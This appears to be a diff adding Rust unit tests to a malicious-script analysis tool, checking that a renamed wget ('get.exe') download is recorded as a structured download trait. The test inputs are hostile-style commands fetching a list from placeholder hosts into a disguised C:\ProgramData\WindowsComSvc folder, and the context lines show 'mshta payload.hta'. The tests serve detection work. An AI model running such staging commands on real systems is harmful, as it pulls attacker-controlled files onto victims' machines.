@@ -10620,6 +10620,32 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn get_exe_wget_style_attached_input_list_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"get.exe -nc -ihttp://get-input.example/list.txt -P C:\ProgramData\WindowsComSvc"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "http://get-input.example/list.txt",
+                Some(r#"C:\ProgramData\WindowsComSvc"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_short_option_cluster_records_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -28096,6 +28122,39 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert_eq!(
             generic_count, 0,
             "Get.exe URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn get_exe_wget_style_attached_input_file_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\ProgramData\WindowsComSvc\Get.exe -nc --input-file=http://get-input-deob.example/list.txt -P C:\ProgramData\WindowsComSvc"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://get-input-deob.example/list.txt"
+                        && dst.as_deref() == Some("C:\\ProgramData\\WindowsComSvc")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from attached Get.exe input-file: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("get-input-deob.example/list.txt"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "attached Get.exe input-file URL double-emitted: {:?}",
             env.traits
         );
     }
